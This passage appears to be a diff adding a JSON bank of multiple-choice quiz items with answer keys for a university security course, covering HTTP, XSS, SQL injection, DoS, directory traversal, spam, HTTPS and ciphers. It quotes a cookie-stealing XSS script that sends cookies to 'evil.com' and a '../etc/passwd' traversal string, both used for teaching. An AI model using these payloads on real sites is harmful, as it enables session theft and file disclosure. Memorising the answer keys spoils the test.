+      "case": "A web server at a school portal builds HTML responses from data that includes user-supplied text. It does not sanitize what it emits, so a script a pupil once submitted comes back inside a page and runs in every teacher's browser. The pupil never attacked a teacher directly.",
+      "question": "Which course concept does this scenario describe?",
+      "options": [
+        "A memory leak exhausting the browser's heap",
+        "An environmental variable injecting a fake PATH",
+        "Output from one program serves as input to another program — unsanitized output (here causing an XSS attack) becomes a security threat to the consumer of the output",
+        "A buffer overflow caused by oversized input"
+      ],
+      "answer": 2,
+      "explanation": "The slides use exactly this case: in most cases the output from one program serves as input to another — as in the XSS attack, where the response message output from a web server serves as input to the web browser. Because the web server does not properly secure its output, it inadvertently leads to an attack on the client consuming the data."
+    },
+    {
+      "topic": "Module 5 · System Calls & Secure Program Output",
+      "case": "Following the incident, the school portal team institutes a rule for every generator of HTML, JSON and CSV: whatever the program emits must be made safe for whatever will consume it.",
+      "question": "Which closing rule of program security does this enforce?",
+      "options": [
+        "Output should be truncated to 256 bytes",
+        "Output should be properly sanitized to prevent it from serving as a security threat to the consumer of the output",
+        "Output should be encrypted with a one-time pad",
+        "Output should be stored in environmental variables"
+      ],
+      "answer": 1,
+      "explanation": "The slides conclude: output from our program should be properly sanitized to prevent serving as a security threat to the consumer of the output. Sanitizing output protects the receiving program — such as the browser in an XSS scenario."
+    }
+  ],
+  "UNIT 4 — Web Security": [
+    {
+      "topic": "Module 1 · The Web & HTTP Fundamentals",
+      "case": "In a seminar, a student claims 'the web is a single giant computer somewhere in America.' The lecturer corrects the student using the course definition of the web.",
+      "question": "How does the course describe the web?",
+      "options": [
+        "A distributed application that runs on the Internet",
+        "A single central computer that stores all documents",
+        "A programming language for building pages",
+        "A cable network connecting all routers"
+      ],
+      "answer": 0,
+      "explanation": "The slides open by defining the web as a distributed application that runs on the Internet. It was developed around early 1994 by Tim Berners-Lee."
+    },
+    {
+      "topic": "Module 1 · The Web & HTTP Fundamentals",
+      "case": "A trainee at a web agency asks how the browser on her phone and the company's webserver ever 'talk' to each other. The supervisor explains that two programs on separate end systems interact by exchanging messages whose structure and exchange rules are defined by one protocol.",
+      "question": "Which protocol is this, and what does it define?",
+      "options": [
+        "SMTP — it defines how email is stored in mailboxes",
+        "FTP — it defines how files are printed",
+        "DNS — it defines how pages are rendered",
+        "HTTP — it defines the structure of the messages exchanged and how the client and server exchange them"
+      ],
+      "answer": 3,
+      "explanation": "The web relies on the hypertext transfer protocol (HTTP), implemented in two programs — the client (browser) and the server (webserver). The two programs, which run on separate end systems, interact by exchanging HTTP messages over the Internet; HTTP defines the structure of the messages and how client and server exchange them."
+    },
+    {
+      "topic": "Module 1 · The Web & HTTP Fundamentals",
+      "case": "A web developer inspects the homepage of a university site. The page consists of a base HTML file plus several referenced items: a JPEG logo, an audio welcome clip, and an embedded Java applet.",
+      "question": "According to the course, what is each page said to consist of?",
+      "options": [
+        "Only text, with no binary objects",
+        "A database table and a stored procedure",
+        "A base HTML file which may include several referenced objects, such as a JPEG image, Java applet, audio file and others",
+        "A single file that cannot reference anything"
+      ],
+      "answer": 2,
+      "explanation": "The slides state that the webserver houses the web pages, and each page consists of a base HTML file which may include several referenced objects such as JPEG images, Java applets, audio files and others. URLs address each page and its referenced objects."
+    },
+    {
+      "topic": "Module 1 · The Web & HTTP Fundamentals",
+      "case": "A student writes this address into a lab report: https://www.usted.edu.gh/about-us",
+      "question": "According to the course, what are the two parts of this URL?",
+      "options": [
+        "Protocol name and port number",
+        "Hostname: www.usted.edu.gh — and the object's pathname: /about-us",
+        "Hostname: /about-us — and pathname: www.usted.edu.gh",
+        "IP address and MAC address"
+      ],
+      "answer": 1,
+      "explanation": "Each URL has two parts: the hostname of the server that houses the object, and the object's pathname. For https://www.usted.edu.gh/about-us, the hostname is www.usted.edu.gh and the object pathname is /about-us."
+    },
+    {
+      "topic": "Module 1 · The Web & HTTP Fundamentals",
+      "case": "A tutor asks the class to identify the hostname in the URL https://portal.stu.edu.gh/login/student.",
+      "question": "What is the hostname?",
+      "options": [
+        "portal.stu.edu.gh",
+        "/login/student",
+        "https",
+        "student"
+      ],
+      "answer": 0,
+      "explanation": "The first part of the URL is the hostname of the server that houses the object — here portal.stu.edu.gh. The rest, /login/student, is the object's pathname."
+    },
+    {
+      "topic": "Module 1 · The Web & HTTP Fundamentals",
+      "case": "Whenever a user opens Microsoft Edge to fetch a particular web object, the browser sends a request message and the server answers with a response message containing the object. A trainee asks what transport-layer protocol carries all of this.",
+      "question": "Which transport protocol does HTTP use?",
+      "options": [
+        "UDP",
+        "ICMP",
+        "Bluetooth",
+        "TCP"
+      ],
+      "answer": 3,
+      "explanation": "The transport layer protocol used by HTTP is TCP. During the client request phase, the browser initiates a TCP connection (creates a socket) to the server; after the HTTP messages are exchanged, the TCP connection is closed."
+    },
+    {
+      "topic": "Module 1 · The Web & HTTP Fundamentals",
+      "case": "A network engineer is configuring firewall rules for a new webserver and needs to know which reserved port number the webserver usually runs on so browsers can reach it.",
+      "question": "According to the course, which port number is this?",
+      "options": [
+        "Port 25",
+        "Port 110",
+        "Port 80",
+        "Port 21"
+      ],
+      "answer": 2,
+      "explanation": "During the client request phase the browser initiates a TCP connection (creates a socket) to the server — the webserver usually runs on reserved port number 80."
+    },
+    {
+      "topic": "Module 1 · The Web & HTTP Fundamentals",
+      "case": "A page on an old site references five images. For every single object the browser opens a TCP connection, exchanges request and response messages, and then closes the connection — six connections in total for the page.",
+      "question": "What is this kind of connection called?",
+      "options": [
+        "A broadcast connection",
+        "A non-persistent connection — the connection, request/response exchange and closing happen separately for each object",
+        "A persistent connection — many objects are fetched through a single connection",
+        "A half-open connection"
+      ],
+      "answer": 1,
+      "explanation": "If the object requested has references to other objects, then the TCP connection, the request and response messages exchanged, and the closing of TCP happen for EACH of the objects — this is called a non-persistent connection."
+    },
+    {
+      "topic": "Module 1 · The Web & HTTP Fundamentals",
+      "case": "A modern news site serves a page with 40 images, scripts and stylesheets to each visitor, yet opens only one TCP connection per visit through which the browser fetches many objects.",
+      "question": "What is this kind of connection called?",
+      "options": [
+        "A persistent connection — many objects are fetched through a single connection",
+        "A non-persistent connection — one connection per object",
+        "A secure connection",
+        "A multicast connection"
+      ],
+      "answer": 0,
+      "explanation": "If many objects are fetched through a single connection, this is called a persistent connection."
+    },
+    {
+      "topic": "Module 1 · The Web & HTTP Fundamentals",
+      "case": "In a demonstration, a lecturer opens a browser, types a URL and hits Enter. A packet capture shows: a TCP connection to the server, an HTTP request message from the browser, an HTTP response message from the server containing the object, and then the TCP connection closing.",
+      "question": "According to the course, which program initiates the request and which responds?",
+      "options": [
+        "The webserver sends the request; the browser responds",
+        "The ISP sends both messages on their behalf",
+        "The DNS server sends the request",
+        "The browser (HTTP client) sends the request message; the webserver (HTTP server) responds with response messages containing the objects"
+      ],
+      "answer": 3,
+      "explanation": "Whenever a user initiates a browser to fetch a particular web object, the browser sends HTTP request messages for the objects in the page to the server; the server receives the request and responds with HTTP response messages that contain the objects."
+    },
+    {
+      "topic": "Module 2 · HTTP Messages & Request Methods",
+      "case": "A junior web developer is told to study 'the two kinds of HTTP messages' before touching any backend code.",
+      "question": "Which two types of HTTP messages does the course identify?",
+      "options": [
+        "Encrypted messages and plain messages",
+        "Client messages and database messages",
+        "Request messages and response messages",
+        "Text messages and binary messages"
+      ],
+      "answer": 2,
+      "explanation": "There are two types of HTTP messages: request and response messages. They are the core components of communication in web applications, enabling the exchange of data between clients (like web browsers) and servers."
+    },
+    {
+      "topic": "Module 2 · HTTP Messages & Request Methods",
+      "case": "A packet-capture exercise shows the first line of an HTTP request: 'GET /programmes.php?faculty=engineering HTTP/1.1'. The instructor asks the class to name the three fields of this first line.",
+      "question": "What are the three fields of the request line?",
+      "options": [
+        "The status code, the reason phrase, and the server field",
+        "The method field, the URL field, and the HTTP version field",
+        "The host field, the cookie field, and the port field",
+        "The sender field, the receiver field, and the checksum field"
+      ],
+      "answer": 1,
+      "explanation": "The first line of an HTTP request message is the request line, and it has three fields: the method field (GET), the URL field (/programmes.php?faculty=engineering), and the HTTP version field (HTTP/1.1)."
+    },
+    {
+      "topic": "Module 2 · HTTP Messages & Request Methods",
+      "case": "A login page on a school's portal is carelessly implemented: when the form is submitted, the pupil's username and password appear visibly in the browser's address bar as part of the URL, and the same URL is later found in the browser history.",
+      "question": "Which HTTP method was this form using, and what does the course say about it?",
+      "options": [
+        "GET — it retrieves data from the server, with data sent via the URL (visible in the address bar)",
+        "POST — it sends data in the request body, hidden from the URL",
+        "HEAD — it retrieves headers only",
+        "PUT — it uploads files to the server"
+      ],
+      "answer": 0,
+      "explanation": "GET retrieves data from the server, and its data is sent via the URL — visible in the address bar. Submitting credentials through a GET form therefore leaves them exposed in the URL, the address bar and the history, which is why the course highlights GET's information-leak risk."
+    },
+    {
+      "topic": "Module 2 · HTTP Messages & Request Methods",
+      "case": "A tutor shows the class this captured request:\n\nGET /programmes.php?faculty=engineering HTTP/1.1\nHost: www.usted.edu.gh",
+      "question": "What does this request line tell the server to do?",
+      "options": [
+        "Upload a new programme listing to the server",
+        "Delete the programmes.php file",
+        "Fetch only the headers of the page, without the body",
+        "Retrieve the object at /programmes.php (with the faculty=engineering data appended in the URL) using HTTP version 1.1"
+      ],
+      "answer": 3,
+      "explanation": "This is the slide's GET example: the method GET retrieves data from the server; the URL field is /programmes.php?faculty=engineering; the version is HTTP/1.1; and the Host header names www.usted.edu.gh."
+    },
+    {
+      "topic": "Module 2 · HTTP Messages & Request Methods",
+      "case": "A user logs in to the STU student portal. The capture shows: 'POST /login.php HTTP/1.1', 'Host: www.usted.edu.gh', 'Content-Type: application/x-www-form-urlencoded' and 'Content-Length: 35' — followed by form data in the message body, with nothing sensitive appearing in the URL.",
+      "question": "What distinguishes POST from GET in the course's description?",
+      "options": [
+        "POST is faster than GET because it skips TCP",
+        "POST requests cannot carry any data at all",
+        "POST sends data to the server (e.g., a login form), with the data included in the request body — not visible in the URL",
+        "POST retrieves data and shows it in the address bar"
+      ],
+      "answer": 2,
+      "explanation": "POST sends data to the server (e.g., login form, feedback); the data is included in the request body (not visible in the URL) — the slide's example is exactly this STU-portal login with Content-Type: application/x-www-form-urlencoded and Content-Length headers."
+    },
+    {
+      "topic": "Module 2 · HTTP Messages & Request Methods",
+      "case": "The same captured POST request includes the header 'Content-Type: application/x-www-form-urlencoded' and a 'Content-Length' field.",
+      "question": "What do these headers describe, in a POST request such as this login?",
+      "options": [
+        "The encryption key and its expiry date",
+        "The type of data carried in the request body and the length of that body",
+        "The browser's screen resolution and session ID",
+        "The server's operating system and uptime"
+      ],
+      "answer": 1,
+      "explanation": "In a POST request the submitted data travels in the request body. Content-Type describes the format of that body (here, form-encoded key–value pairs) and Content-Length gives the size of the body — as shown in the slide's STU-portal login example."
+    },
+    {
+      "topic": "Module 2 · HTTP Messages & Request Methods",
+      "case": "An analytics engineer inspects a measurement request sent from a university website to Google Analytics. Among its parameters she sees 'tid=G-13L0H5MMWZ'.",
+      "question": "According to the course's GA4 parameter table, what does tid identify?",
+      "options": [
+        "The website's GA4 measurement ID — it identifies which analytics property receives the data (here, USTED's)",
+        "The screen resolution of the visitor's device",
+        "The engagement time in milliseconds",
+        "The visitor's session count"
+      ],
+      "answer": 0,
+      "explanation": "In the slide's table, tid is the website's GA4 measurement ID: it identifies which analytics property receives the data (here, USTED's)."
+    },
+    {
+      "topic": "Module 2 · HTTP Messages & Request Methods",
+      "case": "A developer wants to check whether a large news article exists on a partner's site and read its last-modified date, without downloading the whole page body.",
+      "question": "Which HTTP method from the course should be used, and what does it do?",
+      "options": [
+        "GET — it downloads the entire body quickly",
+        "POST — it asks the server to summarize the page",
+        "DELETE — it removes the page and returns a receipt",
+        "HEAD — it retrieves only the headers, not the body; used to check if a resource exists or to get metadata"
+      ],
+      "answer": 3,
+      "explanation": "HEAD only retrieves headers, not the body; it is used to check if a resource exists or to get metadata — the slide's example is 'HEAD /news.html HTTP/1.1, Host: www.stu.edu.gh'."
+    },
+    {
+      "topic": "Module 3 · Cross-Site Scripting (XSS) & Content Security",
+      "case": "On a school forum, a pupil pastes a snippet of code into a comment field. Weeks later, teachers report their accounts behaving strangely. Investigation shows the pupil's snippet ran inside every teacher's browser whenever they viewed the forum — the pupil never touched a teacher's machine directly.",
+      "question": "Which attack does the course define this as?",
+      "options": [
+        "A denial-of-service attack — the site is flooded with fake requests",
+        "Directory traversal — hidden server files are downloaded",
+        "Cross-site scripting (XSS) — the attacker injects client-side scripts into a website so they are executed by other users who visit the site",
+        "SQL injection — arbitrary SQL is executed on the database"
+      ],
+      "answer": 2,
+      "explanation": "Cross-site scripting is an attack whereby an attacker injects client-side scripts into a website so that such scripts are executed by other users who visit the site. The attacker does not directly attack the victim — he exploits loopholes in the security of a website the victim visits."
+    },
+    {
+      "topic": "Module 3 · Cross-Site Scripting (XSS) & Content Security",
+      "case": "The school forum accepted the pupil's snippet because the comment field stored and redisplayed whatever was typed — code was accepted as if it were ordinary text.",
+      "question": "According to the course, what security loophole made this XSS possible?",
+      "options": [
+        "The site had too many registered users",
+        "The site did not sanitize such inputs before accepting them into the website — malicious code was taken as ordinary text",
+        "The site used TCP instead of UDP",
+        "The site ran on port 80 instead of port 8080"
+      ],
+      "answer": 1,
+      "explanation": "The slides explain that the vulnerable website has security loopholes of allowing an attacker to enter malicious codes taken as ordinary texts into its website by not sanitizing such inputs before accepting them."
+    },
+    {
+      "topic": "Module 3 · Cross-Site Scripting (XSS) & Content Security",
+      "case": "The pupil's snippet had been stored in the forum's database, so it executed for every visitor who opened any thread page — not just people who clicked a special link.",
+      "question": "Which type of XSS is this?",
+      "options": [
+        "Persistent XSS — the malicious code finds its way into the website's database and is executed by all victim browsers that visit the site",
+        "Reflected XSS — the malicious code string originates from the victim's own request",
+        "Snowshoe spam — junk mail spread across many IPs",
+        "A side-channel attack — the key is recovered from power readings"
+      ],
+      "answer": 0,
+      "explanation": "Persistent XSS is when the malicious codes find their way into the website's database and eventually get executed by all victim browsers that visit the site — exactly the forum situation."
+    },
+    {
+      "topic": "Module 3 · Cross-Site Scripting (XSS) & Content Security",
+      "case": "A different attacker crafts a URL containing a script in its query string and emails it to one accountant. When she clicks it, the school's search page echoes the query string back into the page without sanitizing it, and the script runs in her browser.",
+      "question": "Which type of XSS is this, and why?",
+      "options": [
+        "Persistent XSS — the code was stored in the database",
+        "Directory traversal — the URL escaped the web root",
+        "Snowshoe spam — the link was mailed widely",
+        "Reflected XSS — the malicious code string originates from the victim's own request"
+      ],
+      "answer": 3,
+      "explanation": "In reflected XSS, the malicious code string originates from the victim's request. The server echoes it back unsanitized, so the victim's own request carries the payload — nothing is stored in the database."
+    },
+    {
+      "topic": "Module 3 · Cross-Site Scripting (XSS) & Content Security",
+      "case": "The attacker who emailed the malicious URL to one accountant now wants to hit many victims at once instead of one.",
+      "question": "According to the course, how does an attacker launch a reflected XSS attack against a large group?",
+      "options": [
+        "Bribe the database administrator",
+        "Measure the power consumption of the webserver",
+        "Publish a link to the malicious URL — on his own website or a social network — and wait for visitors to click it",
+        "Physically install a sniffer in the office LAN"
+      ],
+      "answer": 2,
+      "explanation": "The slides describe two ways of tricking victims into launching reflected XSS: if the attacker targets a specific individual, he sends the malicious URL to the victim (e.g., by email or instant messaging) and tricks them into visiting it; if he targets a large group, he publishes a link to the malicious URL (on his website or a social network) and waits for visitors to click it."
+    },
+    {
+      "topic": "Module 3 · Cross-Site Scripting (XSS) & Content Security",
+      "case": "Forensic analysts find that the injected script on the school forum was:\n\n<script>document.location='http://evil.com/steal?cookie='+document.cookie<\/script>",
+      "question": "What did this script do to each visiting teacher's browser?",
+      "options": [
+        "It printed the school's term calendar",
+        "It redirected the browser to evil.com, carrying the victim's cookie — including session cookies — appended in the URL",
+        "It deleted all files on the webserver",
+        "It changed the teacher's screen resolution"
+      ],
+      "answer": 1,
+      "explanation": "This is the slide's example script: it sets document.location to the attacker's URL and appends document.cookie — the victim's cookies — as a query parameter. The attacker's site receives the victim's cookies, which typically include session identifiers."
+    },
+    {
+      "topic": "Module 3 · Cross-Site Scripting (XSS) & Content Security",
+      "case": "The school's new security engineer proposes a defense: browsers viewing the school's pages should be constrained so that pages can only use resources (scripts, stylesheets, images) downloaded from a defined set of trusted sources, and inline JavaScript should not be evaluated.",
+      "question": "Which countermeasure is this, and what does the course say it achieves?",
+      "options": [
+        "Content Security Policy (CSP) — even if an attacker succeeds in injecting malicious content, CSP can prevent it from ever being executed",
+        "Cross-Origin-Resource-Policy (CORP) — it stops other websites from loading this site's files",
+        "HTTPS — it encrypts traffic between client and server",
+        "Snowshoe filtering — it spreads spam across many IP addresses"
+      ],
+      "answer": 0,
+      "explanation": "CSP is used to constrain browsers viewing your page so that it can only use resources downloaded from trusted sources (a resource is a script, style sheet, image, or other file type referred to by the page). This means that even if an attacker succeeds in injecting malicious content into your website, CSP can prevent it from ever being executed. Its rules include: no untrusted sources, and no inline resources (inline JavaScript and CSS will not be evaluated)."
+    },
+    {
+      "topic": "Module 3 · Cross-Site Scripting (XSS) & Content Security",
+      "case": "The school also hosts downloadable course images and JSON data. The engineer adds a response header that tells browsers which OTHER websites are authorized to load those files, to stop other sites from pulling the school's resources into their own pages and to help stop side-channel attacks and hotlinking.",
+      "question": "Which mechanism, and which of its three types, is closest to the strictest setting that only allows the school's own site to load the resource?",
+      "options": [
+        "CORP with the value cross-origin",
+        "Content Security Policy with the value same-site",
+        "HTTP Strict Transport Security",
+        "Cross-Origin-Resource-Policy (CORP) with the value same-origin"
+      ],
+      "answer": 3,
+      "explanation": "CORP instructs the browser on which other websites are authorized to load a resource, helping stop data-leak attempts including side-channel attacks and unwanted hotlinking. Its three types are Cross-Origin-Resource-Policy: same-origin, same-site, and cross-origin — with same-origin being the strictest (only the school's own origin may load the resource)."
+    },
+    {
+      "topic": "Module 4 · SQL Injection, DoS, Directory Traversal & Spam",
+      "case": "A marketplace's product-search box concatenates whatever the user types straight into a database query. An attacker types a carefully crafted string that ends the intended query and appends her own SQL, letting her read the whole customer table — even though her own account has no permission to see it.",
+      "question": "According to the course, what do SQL injection vulnerabilities enable?",
+      "options": [
+        "Attackers to steal browser cookies via injected scripts",
+        "Attackers to hide junk email across many IP addresses",
+        "Malicious users to execute arbitrary SQL code on the database, allowing data to be accessed, modified, or deleted irrespective of the user's permissions",
+        "Attackers to crash the webserver with fake requests"
+      ],
+      "answer": 2,
+      "explanation": "SQL injection vulnerabilities enable malicious users to execute arbitrary SQL code on a database, allowing data to be accessed, modified, or deleted irrespective of the user's permissions."
+    },
+    {
+      "topic": "Module 4 · SQL Injection, DoS, Directory Traversal & Spam",
+      "case": "Following the customer-table leak, the marketplace's developers must fix the search box. The security lead reminds them what a successful injection can do: spoof identities, create new identities with administration rights, access all data on the server, or destroy/modify the data to make it unusable.",
+      "question": "Which countermeasure does the course prescribe for SQL injection?",
+      "options": [
+        "Block all GET requests at the firewall",
+        "Escape all the characters in the user input that have a special meaning in SQL",
+        "Rename the database tables to random strings",
+        "Move the database to a different building"
+      ],
+      "answer": 1,
+      "explanation": "The slides give the SQL-attack countermeasure as: escape all the characters in the user input that have a special meaning in SQL — so user input can no longer terminate or alter the intended query."
+    },
+    {
+      "topic": "Module 4 · SQL Injection, DoS, Directory Traversal & Spam",
+      "case": "During a vendor's flash sale, a rival pays for a botnet to swamp the site with millions of requests; others in the botnet hold connections open with very slow reads and giant uploads. Legitimate shoppers cannot get through all evening.",
+      "question": "Which attack is this, and how does the course characterize its requests?",
+      "options": [
+        "Denial of Service (DoS) — flooding a target site with fake requests so access is disrupted for legitimate users; requests may simply be numerous, or may individually consume large amounts of resource (slow reads, uploading large files)",
+        "Snowshoe spam — junk email spread across many domains",
+        "Reflected XSS — a script echoed from the victim's own request",
+        "Directory traversal — filenames containing navigation characters"
+      ],
+      "answer": 0,
+      "explanation": "DoS is usually achieved by flooding a target site with fake requests so that access to a site is disrupted for legitimate users. The requests may simply be numerous, or they may individually consume large amounts of resource (e.g., slow reads or uploading of large files) — both seen in this case."
+    },
+    {
+      "topic": "Module 4 · SQL Injection, DoS, Directory Traversal & Spam",
+      "case": "The flash-sale site's engineering team argues about where to put the DoS defences: inside the shopping application's code, or elsewhere. The security architect cites the course's guidance.",
+      "question": "Where does the course say DoS defences are typically located, and how do they work?",
+      "options": [
+        "Inside the customer's browser, as a browser extension",
+        "In the database stored procedures",
+        "Nowhere — DoS cannot be defended against",
+        "Before or in the webserver — they identify and block 'bad' traffic while allowing legitimate messages through; they are not part of the web application itself"
+      ],
+      "answer": 3,
+      "explanation": "The slides state that DoS defences usually work by identifying and blocking 'bad' traffic while allowing legitimate messages through, and that these defences are typically located before or in the webserver (they are not part of the web application itself)."
+    },
+    {
+      "topic": "Module 4 · SQL Injection, DoS, Directory Traversal & Spam",
+      "case": "A mis-configured file-download endpoint lets a user request a filename like '../../../../etc/passwd'. The endpoint happily walks out of the public web folder and hands over a system file the user should never see.",
+      "question": "Which attack is this?",
+      "options": [
+        "Snowshoe spam — small mailings from many IPs",
+        "A man-in-the-middle attack on the LAN",
+        "Directory traversal (file and disclosure) — accessing parts of the webserver file system the user should not be able to access, by passing filenames that include file-system navigation characters",
+        "Cross-site scripting — scripts running in other users' browsers"
+      ],
+      "answer": 2,
+      "explanation": "In a directory traversal attack, a malicious user attempts to access parts of the webserver file system that they should not be able to access. The vulnerability occurs when the user is able to pass filenames that include file-system navigation characters — such as the ../ sequences in this case."
+    },
+    {
+      "topic": "Module 4 · SQL Injection, DoS, Directory Traversal & Spam",
+      "case": "After the traversal incident, the team assesses the blast radius: what a successful directory-traversal attack could have exposed on the webserver.",
+      "question": "Which of the following could the attacker NOT have obtained through directory traversal, according to the course's list?",
+      "options": [
+        "Student or customer information, website settings and source code",
+        "A faster CPU for the attacker's own laptop",
+        "Database passwords",
+        "Private documents"
+      ],
+      "answer": 1,
+      "explanation": "The slides list what attackers could get through directory traversal: database passwords; private documents; student or customer information; and website settings and source code. Hardware upgrades for the attacker are obviously not among them."
+    },
+    {
+      "topic": "Module 4 · SQL Injection, DoS, Directory Traversal & Spam",
+      "case": "To prevent a repeat, the team reviews the course's checklist for the file-download endpoint.",
+      "question": "Which combination makes up the course's prevention advice for directory traversal?",
+      "options": [
+        "Limit the server's permissions; keep software updated; keep private files out of public folders",
+        "Escape SQL special characters; use HEAD requests; rotate API keys",
+        "Add more public folders; enable directory listings; share the web root",
+        "Install a bigger hard disk; change the domain name; block all downloads"
+      ],
+      "answer": 0,
+      "explanation": "The slides' prevention list for directory traversal (file and disclosure) is: limit the server's permissions; keep software updated; and keep private files out of public folders."
+    },
+    {
+      "topic": "Module 4 · SQL Injection, DoS, Directory Traversal & Spam",
+      "case": "A company's mail servers notice that thousands of junk emails promoting a rival's shop are arriving — but unlike normal spam, they come from many different IP addresses and many different domains, with only a tiny number of messages from each source. None of the sources individually looks like a spammer.",
+      "question": "Which technique is this, and what is its goal?",
+      "options": [
+        "Directory traversal — filenames with navigation characters",
+        "Persistent XSS — scripts stored in the database",
+        "A brute-force attack — testing every possible key",
+        "Snowshoe spam — a spammer spreads junk email across many IP addresses and many domains, sending only a small amount from each one, to stay under the radar of spam filters"
+      ],
+      "answer": 3,
+      "explanation": "Snowshoe spam is a spamming technique where a spammer spreads their junk email across many IP addresses and many domains, sending only a small amount from each one. The goal is to stay under the radar of spam filters."
+    },
+    {
+      "topic": "Module 4 · SQL Injection, DoS, Directory Traversal & Spam",
+      "case": "The security team must explain to management why their per-sender spam filters failed against this campaign.",
+      "question": "Why does snowshoe spam evade such filters, in the course's words?",
+      "options": [
+        "Because the emails contain no text at all",
+        "Because the senders bribe the mail administrators",
+        "Because each source sends only a small amount, no single IP or domain crosses the threshold that would get it blocked — the spam stays under the radar",
+        "Because the emails are encrypted with a one-time pad"
+      ],
+      "answer": 2,
+      "explanation": "The essence of snowshoe spam is staying under the radar of spam filters: by spreading the mailing across many IPs and domains and sending only a small amount from each, no single source accumulates the reputation damage that filters rely on."
+    },
+    {
+      "topic": "Module 4 · SQL Injection, DoS, Directory Traversal & Spam",
+      "case": "A junior analyst must match each incident to its countermeasure: (1) a search box that runs attacker SQL; (2) a forum comment that runs scripts in teachers' browsers; (3) a botnet flooding the site; (4) a download endpoint that hands out /etc/passwd.",
+      "question": "Which mapping is correct?",
+      "options": [
+        "(1) update software; (2) filter traffic; (3) escape SQL; (4) sanitize output",
+        "(1) escape SQL special characters in input; (2) sanitize input/output and use CSP; (3) traffic filtering before or in the webserver; (4) limit permissions, update software, keep private files out of public folders",
+        "(1) use CSP; (2) escape SQL characters; (3) hide files from public folders; (4) filter traffic",
+        "(1) filter traffic; (2) limit permissions; (3) escape SQL; (4) use CSP"
+      ],
+      "answer": 1,
+      "explanation": "Each pairing follows the slides: SQL injection → escape all characters with special meaning in SQL; XSS → prevention by sanitizing input/output and Content Security Policy; DoS → defences before or in the webserver that block bad traffic; directory traversal → limit server permissions, keep software updated, keep private files out of public folders."
+    },
+    {
+      "topic": "Module 5 · Web Threat Landscape & HTTPS",
+      "case": "An auditor warns the university: every file placed anywhere under a web directory on the server can simply be downloaded by anyone who asks — because one HTTP method can fetch any web object from the server, and staff have been dropping spreadsheets of student data into a 'temp' folder inside the web root.",
+      "question": "Which key web threat does the course say this illustrates?",
+      "options": [
+        "The GET method gives clients easy access to information on the webserver — all files accessible under a web directory can be downloaded via GET requests, so sensitive information can leak via the web",
+        "HEAD requests print entire databases",
+        "POST requests always expose passwords in the URL",
+        "TCP connections never close on modern sites"
+      ],
+      "answer": 0,
+      "explanation": "The slides identify one of the key threats confronting the web: the ability of a client to easily access any information on the webserver through the GET method — all files accessible under a web directory can be downloaded via GET requests, which can make sensitive information leak via the web."
+    },
+    {
+      "topic": "Module 5 · Web Threat Landscape & HTTPS",
+      "case": "A security reviewer traces the root cause of many web threats at a bank portal: the messages exchanged between server and client travel as plaintext across the Internet.",
+      "question": "According to the course, why do web applications face these threats?",
+      "options": [
+        "Because browsers are too old to render HTML",
+        "Because web pages contain too many images",
+        "Because port 80 is reserved",
+        "Because of the vulnerabilities exposed by plaintext messages exchanged between server and client"
+      ],
+      "answer": 3,
+      "explanation": "The slides state that a number of threats face web applications because of the vulnerabilities exposed by plaintext messages exchanged between server and client."
+    },
+    {
+      "topic": "Module 5 · Web Threat Landscape & HTTPS",
+      "case": "The bank deploys HTTPS on its portal. A year later, analysts ask what exactly this changed.",
+      "question": "According to the course, what does HTTPS do?",
+      "options": [
+        "It blocks all scripts from running in browsers",
+        "It hides the website's IP address from DNS",
+        "It encrypts the data sent between the client and server, ensuring that login credentials, cookies, POST request data and header information are not easily available to attackers",
+        "It compresses pages so they load faster"
+      ],
+      "answer": 2,
+      "explanation": "HTTPS encrypts data sent between the client and server. This ensures that login credentials, cookies, POST requests data and header information are not easily available to attackers."
+    },
+    {
+      "topic": "Module 5 · Web Threat Landscape & HTTPS",
+      "case": "After moving to HTTPS, the bank's app team claims 'we are now fully secure.' The security architect disagrees: a passive eavesdropper on the café Wi-Fi can no longer read credentials in transit, but the app's search box still concatenates raw input into SQL, and its forum still displays comments without sanitization.",
+      "question": "Which assessment of HTTPS is correct, per the course?",
+      "options": [
+        "HTTPS blocks fake requests in a DoS flood",
+        "HTTPS protects data in transit (credentials, cookies, POST data, headers) from eavesdroppers — but it does not fix application-level flaws such as SQL injection or unsanitized output that leads to XSS",
+        "HTTPS prevents SQL injection automatically",
+        "HTTPS sanitizes all forum comments before display"
+      ],
+      "answer": 1,
+      "explanation": "HTTPS encrypts data sent between client and server — protecting login credentials, cookies, POST data and headers from being easily available to attackers (the passive eavesdropper). But injection-based application flaws like SQL injection and XSS stem from how the application handles input and output, which encryption of the transport channel does not address."
+    }
+  ],
+  "UNIT 5 — Simple Symmetric Encryption & Steganography": [
+    {
+      "topic": "Module 1 · Substitution & Caesar (Shift) Ciphers",
+      "case": "A spy club wants to protect its meeting notes. The simplest scheme their instructor proposes: take each letter of the alphabet and systematically replace it with another letter, then apply the same table when encrypting every message.",
+      "question": "What is this method called, and what is its goal?",
+      "options": [
+        "The substitution cipher — its goal is the encryption of text by substituting each letter of the alphabet with another one",
+        "The one-time pad — its goal is to reuse a random key forever",
+        "Steganography — its goal is to hide the existence of the message",
+        "The rail fence cipher — its goal is to permute the letter positions"
+      ],
+      "answer": 0,
+      "explanation": "The substitution (replacement) cipher is one of the simplest methods for encrypting text: the idea is very simple — we substitute each letter of the alphabet with another one. Its goal is the encryption of text."
+    },
+    {
+      "topic": "Module 1 · Substitution & Caesar (Shift) Ciphers",
+      "case": "The spy club adopts this key: A→k, B→d, C→w. A member must encrypt the message 'ABBA' before hiding it in the club's noticeboard.",
+      "question": "Using the club's key, what is the ciphertext of ABBA?",
+      "options": [
+        "kkdd",
+        "dkdk",
+        "wddw",
+        "kddk"
+      ],
+      "answer": 3,
+      "explanation": "Encrypt letter by letter with the key: A→k, B→d, B→d, A→k. The ciphertext is kddk — exactly the slide's worked example."
+    },
+    {
+      "topic": "Module 1 · Substitution & Caesar (Shift) Ciphers",
+      "case": "Using the same spy-club key (A→k, B→d, C→w), a member must encrypt the shorter message 'CAB'.",
+      "question": "What is the ciphertext of CAB?",
+      "options": [
+        "dkw",
+        "kdw",
+        "wkd",
+        "kwd"
+      ],
+      "answer": 2,
+      "explanation": "Apply the key letter by letter: C→w, A→k, B→d. The ciphertext is therefore wkd. (The order of the letters follows the plaintext; each letter is replaced by its assigned substitute.)"
+    },
+    {
+      "topic": "Module 1 · Substitution & Caesar (Shift) Ciphers",
+      "case": "The club's instructor now introduces an elegant scheme with a mathematical description: every plaintext letter is shifted by a fixed number of positions in the alphabet. It is a special case of the substitution cipher.",
+      "question": "Which cipher is this?",
+      "options": [
+        "The transposition cipher",
+        "The shift (Caesar) cipher",
